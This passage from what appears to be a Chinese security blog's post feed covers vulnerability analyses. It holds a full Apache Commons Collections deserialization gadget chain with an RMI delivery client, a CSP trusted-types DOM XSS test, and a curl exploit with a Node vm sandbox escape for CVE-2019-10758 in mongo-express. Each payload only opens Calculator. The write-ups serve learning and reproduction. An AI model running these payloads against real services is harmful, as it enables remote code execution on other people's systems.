step3ÔºöÂØªÊâæËá™Âä®Ëß¶ÂèëtransformÂú®step2ÁöÑpoc‰∏≠Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåÂèçÂ∫èÂàóÂåñ‰πãÂêéÂÖ∂ÂÆûËøòÊúâ‰∏Ä‰∏™ÂØπÂØπË±°ËøõË°åtransformÂáΩÊï∞ÁöÑË∞ÉÁî®ÔºåËôΩÁÑ∂Ê≠§Êó∂Â∑≤ÁªèÈÄöËøáÂèçÂ∞ÑÈìæËß£ÂÜ≥‰∫ÜRuntime.getRuntime()ÁöÑÂèÇÊï∞‰º†ÂÖ•ÈóÆÈ¢òÔºå‰ΩÜÊòØ‰ªçÁÑ∂ÈúÄË¶ÅÊàë‰ª¨Ë∞ÉÁî®transformÂáΩÊï∞„ÄÇ12Transformer transformer = (Transformer) unserialize();transformer.transform(""); ËøôÊ†∑ÁöÑÊù°‰ª∂Âú®ÂÆûÈôÖÁéØÂ¢É‰∏≠ÊòØÈöæ‰ª•Âà©Áî®ÁöÑÔºåÊàë‰ª¨Â∏åÊúõÁöÑÊòØ‰ªÖË∞ÉÁî®readObjectÂáΩÊï∞Â∞±ËÉΩÂ§üËß¶ÂèëÊºèÊ¥ûÔºåÂç≥ÈúÄË¶ÅÂØªÊâæ‰∏Ä‰∏™ÊúâË¢´ÈáçÂÜôÁöÑreadObjectÂáΩÊï∞ÔºåËÄåÂÖ∂‰∏≠ÁöÑÊµÅÁ®ãËÉΩÂ§üËß¶ÂèëtransformÂáΩÊï∞(ÂèØ‰ª•Áõ¥Êé•ÊêúÁ¥¢Ëøô‰∏§‰∏™ÂÖ≥ÈîÆÂ≠óÂØªÊâæ)„ÄÇ Âú®/org/apache/commons/collections/map/TransformedMap.java‰∏≠:1234567891011121314151617181920212223//65Ë°å public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125;//87Ë°å protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125;//137Ë°å protected Object transformValue(Object object) &#123; if (valueTransformer == null) &#123; return object; &#125; return valueTransformer.transform(object); &#125;//183Ë°å public Object put(Object key, Object value) &#123; key = transformKey(key); value = transformValue(value); return getMap().put(key, value); &#125; ÈÄöËøáTransformedMapÂáΩÊï∞ËÆæÁΩÆÊàêÂëòÂèòÈáèÔºåÈÄöËøáË∞ÉÁî®putÂáΩÊï∞ÔºåËß¶ÂèëtransformValueÂáΩÊï∞ÁöÑvalueTransformer.transform(object)Ë∞ÉÁî®„ÄÇpocÔºö12345678910111213141516 public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //Â∞ÜtransformersÊï∞ÁªÑÂ≠òÂÖ•ChaniedTransformerËøô‰∏™ÁªßÊâøÁ±ª Transformer transformerChain = new ChainedTransformer(transformers); //ÂàõÂª∫MapÂπ∂ÁªëÂÆötransformerChain Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put("value", "value");&#125; ËôΩÁÑ∂ÊâæÂà∞‰∫Ü‰∏Ä‰∏™ËÉΩËá™Âä®Ë∞ÉÁî®transformÁöÑËøáÁ®ãÔºå‰ΩÜÊòØË¶ÅÂÆûÁé∞ÂèçÂ∫èÂàóÂåñÂëΩ‰ª§ÊâßË°åÔºåËøòÈúÄË¶ÅÊúâÂØπmapÁöÑÊìç‰Ωú„ÄÇËøôÈáåËøòÊúâÂè¶Â§ñ‰∏ÄÂ§Ñ‰πüÊúâË∞ÉÁî®transformÊñπÊ≥ïÁöÑÂäüËÉΩÔºö1234// 168Ë°åprotected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; Âú®ÂÖ∂Áà∂Á±ª/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java‰∏≠ÂÆûÁé∞‰∫Ü‰∏Ä‰∏™ÈùôÊÄÅÁ±ªÁöÑÂÆö‰πâÔºö12345678910111213141516// 180Ë°å static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); // Ë∞ÉÁî®ÁÇπ return entry.setValue(value); &#125; &#125; ËøôÈáåÁî®‰∫ÜjavaÁ±ªÁöÑÂµåÂ•óÔºåÂíåphpËØ≠Ë®ÄÁâπÊÄßÊúâÁÇπÂå∫Âà´Ôºöhttps://blog.csdn.net/hguisu/article/details/7270086 step3: ÂØªÊâæÈáçÂÜôreadObjectÂú®jdkÂ∞è‰∫éÁ≠â‰∫é1.7ÁöÑÊó∂Ôºå/sun/reflect/annotation/AnnotationInvocationHandler.class‰∏≠ÁöÑreadObject‰∏≠ÊúâÂØπmapÁöÑ‰øÆÊîπÂäüËÉΩ„ÄÇ ËøôÈáå‰æø‰∫éÂàÜÊûêÔºåÁî®jd-guiÂ∞ÜÂÖ∂jarÂåÖÈÄÜÂêëÔºö/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jarËøôÈáåreadObjectÊñπÊ≥ïÔºå‰ΩøÁî®‰∫Üentry.setValueÊñπÊ≥ï„ÄÇ Âú®ÊûÑÈÄ†ÊñπÊ≥ï‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÂÖ∂Â∞ÜÂÆû‰æãÂåñ‰º†ÂÖ•ÁöÑÂèÇÊï∞ËÆæ‰∏∫ÂÖ∂ÊàêÂëòÂèòÈáèthis.memberValues,Êé•ÁùÄÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÔºåÈÄöËøáÂØπreadObjectÁöÑË∞ÉÁî®ÔºåËß¶ÂèëMapEntryÁöÑsetValueÊñπÊ≥ï„ÄÇ ÊúÄÂêépocÁî®‰∫ÜjavaÂèçÂ∞ÑÂéªÂÆû‰æãÂåñÂàõÂª∫ÂØπË±°ÔºåÊûÑÈÄ†Âá∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÊîªÂáªÈìæÔºö1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.util.HashMap;import java.lang.reflect.Constructor;import java.util.Map;public class test &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //Â∞ÜtransformersÊï∞ÁªÑÂ≠òÂÖ•ChaniedTransformerËøô‰∏™ÁªßÊâøÁ±ª Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put("value", "2"); // Êª°Ë∂≥/org/apache/commons/collections/map/AbstractMapDecorator.javaÁöÑnullÂà§Êñ≠,‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÈîÆÂêç‰∏ÄÂÆöË¶ÅÊòØvalueÔºåË∞É‰∫ÜÂæàÂ§öÊ¨°ËøòÊòØÊ≤°Ëß£ÂÜ≥ÔºåÊ±ÇËß£ Map transformedmap = TransformedMap.decorate(map, null, transformerChain); // Âä†ËΩΩÁ±ª Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); // ÂÆû‰æãÂåñ Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); // Ëé∑ÂèñÊåáÂÆöÁöÑÊûÑÈÄ†ÊñπÊ≥ï cons.setAccessible(true); //‰∏∫ÂèçÂ∞ÑÂØπË±°ËÆæÁΩÆÂèØËÆøÈóÆÊ†áÂøó Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap); // Â∫èÂàóÂåñ ByteArrayOutputStream exp = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(exp); oos.writeObject(ins); oos.flush(); oos.close(); ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray()); ObjectInputStream ois = new ObjectInputStream(out); Object obj = (Object) ois.readObject(); &#125;&#125; ÊµÅÁ®ãÔºöÂèÇËÄÉseebugÁöÑ‰∏ÄÂº†Âõæ ËøúÁ®ãÂà©Áî®ÂÆûÁé∞ÂÖàÂ≠¶‰π†Âá†‰∏™Ê¶ÇÂøµÔºö RMI(Remote Method Invocation)ÊòØ‰∏ÄÁßçÂü∫‰∫éÂ∫èÂàóÂåñJavaËøúÁ®ãÊñπÊ≥ïË∞ÉÁî®Êú∫Âà∂Ôºå‰Ωú‰∏∫‰∏Ä‰∏™Â∏∏ËßÅÁöÑÂèçÂ∫èÂàóÂåñÂÖ•Âè£ÔºåÂíåÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊúâÂØÜÂàáËÅîÁ≥ª„ÄÇÂà©Áî®ËøôÁßçÊú∫Âà∂ÂèØ‰ª•ËÆ©ÊüêÂè∞ÊúçÂä°Âô®‰∏äÁöÑÂØπË±°Âú®Ë∞ÉÁî®Âè¶Â§ñ‰∏ÄÂè∞ÊúçÂä°Âô®‰∏äÁöÑÊñπÊ≥ïÊó∂ÔºåÂíåÂú®Êú¨Âú∞Êú∫‰∏äÂØπË±°Èó¥ÁöÑÊñπÊ≥ïË∞ÉÁî®ÁöÑËØ≠Ê≥ïËßÑÂàô‰∏ÄÊ†∑„ÄÇ JNDIÔºàJava Naming and Directory InterfaceÔºâÔºåJava ÂëΩÂêç‰∏éÁõÆÂΩïÊé•Âè£ÔºåJNDIÊîØÊåÅÁöÑÊúçÂä°‰∏ªË¶ÅÊúâ‰ª•‰∏ãÂá†ÁßçÔºöDNS„ÄÅLDAP„ÄÅ CORBAÂØπË±°ÊúçÂä°„ÄÅRMIÁ≠â„ÄÇ(ËøòÊúâÂæàÂ§öÊ¶ÇÂøµÔºåÂÖàÊåñÂùë) RMIÊúçÂä°Á´ØÂÆûÁé∞ÊûÑÈÄ†‰∏Ä‰∏™UserÊé•Âè£ÔºöUser.java12345678910package RMI;import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote&#123; String name(String name) throws RemoteException; void say(String say) throws RemoteException; void dowork(Object work) throws RemoteException;&#125; ÂÆûÁé∞UserÊé•Âè£ÔºöUserImpl.java1234567891011121314151617181920212223package RMI;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class UserImpl extends UnicastRemoteObject implements User&#123; public UserImpl() throws RemoteException&#123; super(); &#125; @Override public String name(String name) throws RemoteException&#123; return name; &#125; @Override public void say(String say) throws RemoteException&#123; System.out.println("you speak" + say); &#125; @Override public void dowork(Object work) throws RemoteException&#123; System.out.println("your work is " + work); &#125;&#125; ÂÆûÁé∞ServerÁ´ØÔºö1234567891011121314package RMI;import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class UserServer &#123; public static void main(String[] args) throws Exception&#123; String url = "rmi://192.168.43.112:4396/User"; User user = new UserImpl(); LocateRegistry.createRegistry(4396); Naming.bind(url,user); System.out.println("the rmi is running :" + url); &#125;&#125; ËøêË°åÁõëÂê¨Ôºö ÂÆ¢Êà∑Á´ØUserClient:123456789101112131415161718192021222324252627282930313233343536373839404142package RMI;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.Naming;import java.util.HashMap;import java.util.Map;public class UserClient &#123; public static void main(String[] args) throws Exception&#123; String url = "rmi://192.168.43.112:4396/User"; User userClient = (User)Naming.lookup(url); System.out.println(userClient.name("test")); userClient.say("world"); userClient.dowork(getpayload()); &#125; public static Object getpayload() throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open -a Calculator"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put("value", "test"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, transformedMap); return instance; &#125;&#125; ÊúÄÂêéÊúÄÂêéÁöÑtransformÂáΩÊï∞Ë∞ÉÁî®‰ΩøÁî®‰∫Üjdk1.7Â∫ïÂ±ÇjarÂåÖÔºåÊâÄ‰ª•Âú®‰∏çÂêåÁöÑjdkÁâàÊú¨Âà©Áî®ÈìæÊúâÊâÄÂ∑ÆÂºÇ(ÊåñÂùë)ÔºåÂêåÊó∂Ëøô‰∏™ÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÂú®‰∫é/org/apache/commons/collections/functors/InvokerTransformer.javaÂèØ‰ª•ÈÄöËøáÂèçÂ∞ÑË∞ÉÁî®‰ªªÊÑèÂáΩÊï∞ÔºåÂÆòÊñπÂèëÂ∏ÉÁöÑÊñ∞ÁâàÊú¨‰∏≠Â¢ûÂä†‰∫ÜÂØπÁõ∏ÂÖ≥ÂèçÂ∞ÑË∞ÉÁî®ÁöÑÈôêÂà∂ÔºåÂêåÊó∂ÂØπËøô‰∫õ‰∏çÂÆâÂÖ®ÁöÑJavaÁ±ªÁöÑÂ∫èÂàóÂåñÊîØÊåÅÂ¢ûÂä†‰∫ÜÂºÄÂÖ≥(‰πüÂ∞±ÊòØÈªëÂêçÂçï)„ÄÇ javaÈ°πÁõÆÂõ†‰∏∫ÂÖ∂ÂèØ‰ª•Âä†ËΩΩÂæàÂ§ö‰æùËµñjarÂåÖÔºåÂØºËá¥ÂÖ∂ÂèçÂ∫èÂàóÂåñÂèØ‰ª•ÂØªÊâæÁöÑÊîªÂáªËåÉÂõ¥ÂæàÂπøÔºå‰ªé‰æùËµñÊâ©Â±ïÂà∞jdkÂ∫ìÔºåËøô‰πüÊòØjavaÊØîphpÂèçÂ∫èÂàóÂåñÈöæÁöÑÂú∞Êñπ„ÄÇ Ê≠§Â§ñÔºåÁÆÄÂçïÂ≠¶‰π†‰∫Ü‰∏Ä‰∫õjavaËØ≠Ê≥ïÂêéÂ∞±ÂºÄÂßãÂàÜÊûêÊºèÊ¥ûÔºåÂæàÂ§öjavaËØ≠Ê≥ïÁâπÊÄß‰ª•ÂèäÊ¶ÇÂøµ‰∏çÂ§™ÁÜüÊÇâÔºåÊØîÂ¶ÇÂèçÂ∞Ñ„ÄÅÂµåÂ•óÁ±ª„ÄÅJMX„ÄÅJNDIÁ≠âÁ≠âÔºåÊé•‰∏ãÊù•ÊâìÁÆóÂ•ΩÂ•ΩÂº•Ë°•‰∏Ä‰∏ãËøôÊñπÈù¢ÁöÑÁü≠Êùø„ÄÇ ÂèÇËÄÉÔºö https://www.xmanblog.net/java-deserialize-apache-commons-collections/ https://xz.aliyun.com/t/4558#toc-0 https://xz.aliyun.com/t/4711]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSP:trusted-types Âàù‰ΩìÈ™å]]></title>
    <url>%2F2020%2F01%2F14%2FCSPtrusted-types%20%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[ÊñáÁ´†È¶ñÂèëÂÖàÁü•Á§æÂå∫ ‰πãÂâçË¢´ÈóÆÂà∞ËøôÊ†∑‰∏Ä‰∏™ÊúâÊÑèÊÄùÁöÑÈóÆÈ¢òÔºå‰∏∫‰ªÄ‰πàÊñ∞ÁâàChromeÂèñÊ∂à‰∫ÜXSS AuditÊú∫Âà∂Ôºü ‰ª•ÂâçÁúãÂà∞ËøáÊñáÁ´†ËØ¥Êñ∞ÁâàChromeÂèñÊ∂àËøô‰∏™ÁöÑÂéüÂõ†ÊòØÂõ†‰∏∫Ë¢´ÁªïËøáÁöÑÂßøÂäøËøáÂ§ö(Êàë‰πü‰∏çÁü•ÈÅìÂá†‰∏™)ÊàñËÄÖËØ¥ÊòØËØØÊä•ÂΩ±ÂìçÂà∞Ê≠£Â∏∏ÂäüËÉΩ‰∫Ü„ÄÇÂπ∂ËØ¥Áî®trusted-typesÁöÑAPIÊõøÊç¢XSS AuditËÉΩÂΩªÂ∫ïÊùúÁªùDOM XSS„ÄÇ ‰ªîÁªÜË∑ü‰∫Ü‰∏Ä‰∏ãË∞∑Ê≠åÁöÑÂºÄÂèëÊñáÊ°£‰ªãÁªçÔºåÈÄöËøáÁªôCSPÈÖçÁΩÆ‰∏Ä‰∏™trusted-typesÂ±ûÊÄßÔºö1Content-Security-Policy: trusted-types * Êú¨Âú∞ÊµãËØï79.0ÁâàÊú¨Ôºö12345678910111213141516&lt;?phpheader("Content-Security-Policy: trusted-types *");$a= &lt;&lt;&lt;EOF&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt;const templateId = location.hash.match(/tplid=([^;&amp;]*)/)[1];// typeof templateId == "string"document.head.innerHTML += decodeURI(templateId) // Throws a TypeError.&lt;/script&gt;&lt;/html&gt;EOF;echo $a; ‰ΩÜÊòØÂπ∂Ê≤°ÊúâÊäõÂá∫ÈîôËØØÔºåÁªßÁª≠Áøª‰∫Ü‰∏ãÊñáÊ°£ÔºåÊâæÂà∞ÈóÆÈ¢òÊâÄÂú®:ÈúÄË¶ÅÁî®Chrome73-78ÁöÑÁâàÊú¨ÔºåÂÖ∂Ê¨°ÈªòËÆ§ÈÖçÁΩÆÊòØ‰∏çÂºÄÁöÑÔºåËÆøÈóÆchrome://flags/#enable-experimental-web-platform-featuresÂ∞ÜÂÖ∂ÈÖçÁΩÆÊâìÂºÄ„ÄÇ ËøôÈáåÁî®Chrome78ÊµãËØïÔºö ÊäõÂá∫‰∏Ä‰∏™ÈîôËØØÔºåÂº∫Âà∂Ë¶ÅÊ±ÇÊàë‰ª¨‰ΩøÁî®TrustedHTMLÔºå‰øÆÊîπ‰ª£Á†ÅÔºö1234567891011121314151617181920212223242526&lt;?phpheader("Content-Security-Policy: trusted-types *");$a= &lt;&lt;&lt;EOF&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt;const templatePolicy = TrustedTypes.createPolicy('template', &#123; createHTML: (templateId) =&gt; &#123; const tpl = templateId; if (/^[0-9a-z-]$/.test(tpl)) &#123; return `&lt;link rel="stylesheet" href="./templates/\$&#123;tpl&#125;/style.css"&gt;`; &#125; throw new TypeError(); &#125; &#125;);const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;&amp;]*)/)[1]);// html instanceof TrustedHTMLdocument.head.innerHTML = html;&lt;/script&gt;&lt;/html&gt;EOF;echo $a; ÈÄöËøáTrustedTypes.createPolicyËá™ÂÆö‰πâËøáÊª§ÂêéÔºåreturn‰∏Ä‰∏™TrustedHTMLÊù•Êª°Ë∂≥CSPÁöÑÂèØ‰ø°Ë¶ÅÊ±ÇÔºö ÊúÄÂêéÂú®Chrome79‰∏ã,Âç≥‰ΩøÊàë‰ª¨ÂºÄÂêØ‰∫ÜExperimental Web Platform featuresËøô‰∏™ÈÖçÁΩÆÔºå‰ªçÁÑ∂‰ºöÈÅáÂà∞TrustedTypes is not definedÁöÑÈóÆÈ¢òÔºåemmÂèØËÉΩÂäüËÉΩÊ≠£Âú®ËØïÈ™å‰∏≠ÔºåÁÑ∂ÂêéÊñ∞ÁâàÂèàÁªôÁßªÈô§‰∫ÜÔºü ÂÖ∂Ê¨°Âõ†‰∏∫Ëøô‰∏™ÈóÆÈ¢òÊµãËØïÁöÑÊó∂ÂÄôÔºåChrome‰ºöÈªòËÆ§Êõ¥Êñ∞Âà∞79ÁâàÊú¨ÊúâÁÇπÁÉ¶ÔºåÂéªËøôÈáåÔºåÊâæ‰∫Ü‰∏™78ÁâàÊú¨ÁöÑ‰∏ãËΩΩÔºåÊé•ÁùÄËæìmsconfigÊääË∞∑Ê≠åÊúçÂä°ÁöÑÊõ¥Êñ∞ÂÖ≥‰∫ÜÂç≥ÂèØÊúÄÂêéÊâìÂºÄChromeÊïàÊûúÊòØËøôÊ†∑ÁöÑÔºö ÊúÄÂêéÁÆÄÂçïÊÄªÁªì‰∏Ä‰∏ãÔºåChromeÂèñÊ∂à‰∫ÜXSS AuditorÔºåÂèñËÄå‰ª£‰πãÁöÑÊòØtrusted-typesÂèØ‰ø°APIÔºåÂ£∞Áß∞ÂèØ‰ª•ÂΩªÂ∫ïÊùúÁªùDOM XSSÔºåÁªèËøá‰∏ÄÁï™‰ΩìÈ™åÂêéÔºåÂÖ∂ÂÆûÊú¨Ë¥®‰∏ä‰∏∫Âº∫Âà∂ÂºÄÂèëÂÜô‰∏ÄÊÆµÊõ¥‰∏∫‰∏•Ê†ºÁöÑËøáÊª§ËßÑÂàô„ÄÇ Êã≠ÁõÆ‰ª•ÂæÖÔºåÁúãÁúã‰πãÂêéË∞∑Ê≠åÊúâ‰ªÄ‰πàÊñ∞ÁöÑÊÉ≥Ê≥ï~]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ÂâçÁ´ØÂÆâÂÖ®</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-10758 mongo-express RCEÂ§çÁé∞ÂàÜÊûê]]></title>
    <url>%2F2020%2F01%2F08%2FCVE-2019-10758%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Â§çÁé∞ËøáÁ®ãÊãâ‰∏Ä‰∏™MongoDBÁöÑdockerÈïúÂÉèÔºö1docker run -p 27017:27017 -d mongo Êú¨Âú∞npm initÂàõÂª∫‰∏™package.jsonÔºåÊé•ÁùÄÊ∑ªÂä†‰æùËµñÂ∫ì`mongo-express@0.53.0,npm install`ÂÆâË£Ö123&quot;dependencies&quot;: &#123; &quot;mongo-express&quot;: &quot;0.53.0&quot;&#125;, EXP:1curl &apos;https://localhost:8081/checkValid&apos; -H &apos;Authorization: Basic YWRtaW46cGFzcw==&apos; --data &apos;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&apos; ÊºèÊ¥ûÂàÜÊûêÂÖàÊù•ÁúãÁúãcheckValidËøô‰∏™Ë∑ØÁî±Ôºölib/router.js#279Ë°å Ë∑üËøõcheckValidÂáΩÊï∞Ôºölib/routes/document.js#28 Ëé∑ÂèñpostÁöÑÁöÑdocÂèÇÊï∞Ôºå‰ΩøÁî®bsonÂ∫ìËøõË°åBSONÊï∞ÊçÆËΩ¨Êç¢„ÄÇ BSONÊòØ‰∏ÄÁßçËÆ°ÁÆóÊú∫Êï∞ÊçÆ‰∫§Êç¢Ê†ºÂºèÔºå‰∏ªË¶ÅË¢´Áî®‰ΩúMongoDBÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊï∞ÊçÆÂ≠òÂÇ®ÂíåÁΩëÁªú‰º†ËæìÊ†ºÂºè„ÄÇÂÆÉÊòØ‰∏ÄÁßç‰∫åËøõÂà∂Ë°®Á§∫ÂΩ¢ÂºèÔºåËÉΩÁî®Êù•Ë°®Á§∫ÁÆÄÂçïÊï∞ÊçÆÁªìÊûÑ„ÄÅÂÖ≥ËÅîÊï∞ÁªÑÔºàMongoDB‰∏≠Áß∞‰∏∫‚ÄúÂØπË±°‚ÄùÊàñ‚ÄúÊñáÊ°£‚ÄùÔºâ‰ª•ÂèäMongoDB‰∏≠ÁöÑÂêÑÁßçÊï∞ÊçÆÁ±ªÂûã„ÄÇBSON‰πãÂêçÁºò‰∫éJSONÔºåÂê´‰πâ‰∏∫Binary JSONÔºà‰∫åËøõÂà∂JSONÔºâ Ë∑üËøõtoBSONÂáΩÊï∞Ôºölib/bson.js#54Âú®Á¨¨60Ë°åËøõÂÖ•vmÊ≤ôÁÆ±evalÊìç‰Ωú„ÄÇ ‰ΩøÁî®this.constructor.constructorÈÄÉÈÄ∏Ê≤ôÁÆ±ÔºåÂèÇËÄÉhttps://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.htmlÔºå‰ΩøÁî®thisÊåáÂêëVMÂÆπÂô®Â§ñÔºå‰ΩøÁî®.constructorÊåáÂêëÊûÑÈÄ†Âô®ÔºåËÆøÈóÆÊûÑÈÄ†Âô®ÁöÑÊûÑÈÄ†Âô®ÂØπË±°ÔºåÂàõÂª∫‰∏Ä‰∏™ÊûÑÈÄ†ÂáΩÊï∞„ÄÇ demo:12345"use strict";const vm = require("vm");const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator').toString()`);console.log(xyz); ‰øÆÂ§çÂÆòÊñπ‰øÆÂ§çÂà†Èô§‰∫ÜvmÂ∫ìÁöÑÂºïÁî®Ôºöhttps://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2 ÂèÇËÄÉÔºö CVE-2019-10758:mongo-expressRCEÂ§çÁé∞ÂàÜÊûê CVE-2019-10758 POC Sandboxing NodeJS is hard, here is why https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function https://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/ https://github.com/i0natan/nodebestpractices/issues/211]]></content>
      <tags>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJS Headless Âä®ÊÄÅÊºèÊâ´Áà¨Ëô´Â≠¶‰π†ËÆ∞ÂΩï(Áà¨Ëô´ÁØá)]]></title>
    <url>%2F2020%2F01%2F08%2FNodeJS%20Headless%20%E5%8A%A8%E6%80%81%E6%BC%8F%E6%89%AB%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95(%E7%88%AC%E8%99%AB%E7%AF%87)%2F</url>
    <content type="text"><![CDATA[ÊñáÁ´†È¶ñÂèëÂÖàÁü•Á§æÂå∫Ôºöhttps://xz.aliyun.com/t/7064 Âú®‰∏§Âπ¥ÂâçË∞∑Ê≠åÊé®Âá∫‰∫Ü‰∏Ä‰∏™Headless Chrome NodeJS API:PuppeteerÔºåÂêéÊù•Github‰∏Ä‰∏™Â§ßÁâõÁî®PythonÂ∞ÅË£Ö‰∫Ü‰∏ÄÂ•óapiÔºå‰Ωú‰∏∫‰∏Ä‰∏™Á¨¨‰∏âÊñπapi:Pyppeteer„ÄÇ 